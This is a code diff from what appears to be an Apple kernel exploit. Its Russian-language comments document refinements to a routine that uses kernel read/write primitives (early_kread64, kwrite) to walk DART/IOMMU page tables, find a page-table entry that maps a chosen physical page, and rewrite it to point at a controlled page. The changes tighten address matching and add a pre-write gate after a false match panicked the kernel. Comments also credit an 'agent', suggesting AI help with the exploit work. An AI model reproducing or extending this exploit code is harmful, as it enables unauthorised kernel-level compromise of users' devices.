@@ -6830,16 +6830,61 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             }
             if (pteVA) {
-                if ((origPTE & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL)) {
-                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA — патчим");
+                // 1.9.190: точные кодировки in-place (A[12:47]/C[14:41]) — регион-маска
+                // [25:41] матчила ASCII-мусор в kernel data ("eric121") → kwrite в
+                // kernel image → phys-aperture panic 23:02. Только точный PA.
+                if ((origPTE & 0x0000FFFFFFFFF000ULL) == backingPA && (origPTE & ~0x0000FFFFFFFFF000ULL)) {
+                    ptePAMask = 0x0000FFFFFFFFF000ULL;
+                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA (кодировка A) — патчим");
+                } else if ((origPTE & 0x000003FFFFFFC000ULL) == backingPA && (origPTE & ~0x000003FFFFFFC000ULL)) {
+                    ptePAMask = 0x000003FFFFFFC000ULL;
+                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA (кодировка C) — патчим");
                 } else {
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] PTE PA %#018llx ≠ backingPA — НЕ патчим (чужой PTE, неверный DVA/корень)",
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] PTE %#018llx ≠ backingPA точно — НЕ патчим (ложный матч)",
                               (unsigned long long)origPTE]);
                     pteVA = 0;
                 }
             } else {
                 kpNote(r, @"  [P2] ни один корень не дал валидный leaf (bit0) для DVA");
             }
+        }
+        // 1.9.190 (agent-45 р.50): ДЕТЕРМИНИРОВАННЫЙ walk — корни в MAPPER'е:
+        // [mapper+0x170+segIdx*8] = per-seg struct, L0 embedded @ +0x00, bounds
+        // [s+0x20] ≤ DVA < [s+0x28] выбирают segIdx; count [mapper+0xa54].
+        if (!pteVA && kpLooksLikeKernelPointer(mapVA) && dva) {
+            uint32_t segCnt = (uint32_t)(early_kread64(mapVA + 0xa54) & 0xffff);
+            if (segCnt > 16) segCnt = 16;
+            kpNote(r, [NSString stringWithFormat:@"  [P2.5] mapper-walk: segCnt=%u", segCnt]);
+            for (uint32_t sg = 0; sg < segCnt && !pteVA; sg++) {
+                uint64_t s = kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)sg * 8));
+                if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                uint64_t bLo = early_kread64(s + 0x20), bHi = early_kread64(s + 0x28);
+                kpNote(r, [NSString stringWithFormat:@"    seg[%u]=%#llx bounds [%#llx..%#llx)%@", sg,
+                          (unsigned long long)s, (unsigned long long)bLo, (unsigned long long)bHi,
+                          (dva >= bLo && dva < bHi) ? @" ← НАШ" : @""]);
+                if (!(dva >= bLo && dva < bHi)) continue;
+                uint64_t tbl = s;   // L0 embedded @ struct+0x00
+                for (int lvl = 0; lvl < 4 && !pteVA; lvl++) {
+                    uint64_t ent = early_kread64(tbl + (uint64_t)idxs[lvl] * 8);
+                    kpNote(r, [NSString stringWithFormat:@"    seg%d L%d[%u] @ %#llx = %#018llx", sg, lvl, idxs[lvl],
+                              (unsigned long long)(tbl + (uint64_t)idxs[lvl] * 8), (unsigned long long)ent]);
+                    if (lvl == 3) {
+                        if (ent && (ent & 1) &&
+                            (((ent & 0x0000FFFFFFFFF000ULL) == backingPA && (ent & ~0x0000FFFFFFFFF000ULL)) ||
+                             ((ent & 0x000003FFFFFFC000ULL) == backingPA && (ent & ~0x000003FFFFFFC000ULL)))) {
+                            pteVA = tbl + (uint64_t)idxs[3] * 8;
+                            origPTE = ent;
+                            ptePAMask = ((ent & 0x0000FFFFFFFFF000ULL) == backingPA) ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                            kpNote(r, @"  [P2.5] ★ PTE через mapper-walk — PA точный, патчим");
+                        }
+                        break;
+                    }
+                    if (!(ent & 1)) break;
+                    tbl = (ent << 4) & 0x3ffffffc000ULL;
+                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) break;
+                }
+            }
+            if (!pteVA) kpNote(r, @"  [P2.5] mapper-walk: leaf не найден / PA не сошёлся");
         }
         // 1.9.172: FALLBACK — PTE сканом по таблицам от ТЕРМИНАЛЬНОГО dartObj
         // (cmd/op-entry не нужны): mapping персистит, PTE в leaf-таблице;
@@ -6874,13 +6919,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t lim = 0x4000 - (uint32_t)(tblVA & 0x3fff);
                 for (uint32_t o = 0; o + 8 <= lim && !pteVA; o += 8) {
                     uint64_t q = early_kread64(tblVA + o);
-                    if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
-                        (q & ~0x000003FFFE000000ULL)) {
+                    // 1.9.190: ТОЧНЫЙ in-place PA (A/C) — регион-маска [25:41] на
+                    // ASCII "eric121" в kernel data дала ложный PTE → kwrite в
+                    // kernel image → phys-aperture panic. Рыхлое — только репорт.
+                    BOOL exA = ((q & 0x0000FFFFFFFFF000ULL) == backingPA) && (q & ~0x0000FFFFFFFFF000ULL);
+                    BOOL exC = !exA && ((q & 0x000003FFFFFFC000ULL) == backingPA) && (q & ~0x000003FFFFFFC000ULL);
+                    if (exA || exC) {
                         pteVA = tblVA + o;
                         origPTE = q;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (глубина %d): %#018llx (флаги %#llx)",
-                                  (unsigned long long)pteVA, depth, (unsigned long long)q, (unsigned long long)(q >> 51)]);
+                        ptePAMask = exA ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (глубина %d): %#018llx — ТОЧНЫЙ матч (%@)",
+                                  (unsigned long long)pteVA, depth, (unsigned long long)q, exA ? @"A" : @"C"]);
                         return;
+                    }
+                    if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
+                        (q & ~0x000003FFFE000000ULL)) {
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] рыхлый кандидат @ %#llx (глубина %d): %#018llx — НЕ патчим",
+                                  (unsigned long long)(tblVA + o), depth, (unsigned long long)q]);
                     }
                     if (depth < 3 && (q & 1)) {
                         uint64_t child = (q << 4) & 0x3ffffffc000ULL;
@@ -6951,6 +7006,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
             kpNote(r, [NSString stringWithFormat:@"  [P3] frame-scan: кандидатов=%d обойдено=%d (кап-пропуск=%d) рыхлых=%d srcPA=%#llx — %@",
                       nCand, nScanned, nCap, nLoose, (unsigned long long)srcPA, pteVA ? @"PTE НАЙДЕН" : @"PTE нет"]);
+        }
+        if (pteVA) {
+            // 1.9.190: ФИНАЛЬНЫЙ ГЕЙТ перед kwrite (урок паники 23:02 — ложный
+            // матч повёл запись в kernel image): (1) pteVA вне kernel image,
+            // (2) текущее PA-поле == backingPA ТОЧНО, (3) фрейм не deadly.
+            uint64_t kbase190 = kconstant(base);
+            BOOL inImage = (pteVA >= kbase190 && pteVA < kbase190 + 0x6000000ULL);
+            BOOL exactPA = ((origPTE & ptePAMask) == (backingPA & ptePAMask)) &&
+                           ((origPTE & 0x0000FFFFFFFFF000ULL) == backingPA ||
+                            (origPTE & 0x000003FFFFFFC000ULL) == backingPA);
+            uint64_t ptePA190 = kvtophys(pteVA);
+            BOOL deadly = ptePA190 && kpFrameDeadly(ptePA190);
+            if (inImage || !exactPA || deadly) {
+                kpNote(r, [NSString stringWithFormat:@"  [P2] ГЕЙТ ОТКАЗ: inImage=%d exactPA=%d deadly=%d — ЗАПИСЬ ОТМЕНЕНА (pteVA=%#llx origPTE=%#018llx)",
+                          inImage, exactPA, deadly, (unsigned long long)pteVA, (unsigned long long)origPTE]);
+                pteVA = 0;
+            }
         }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
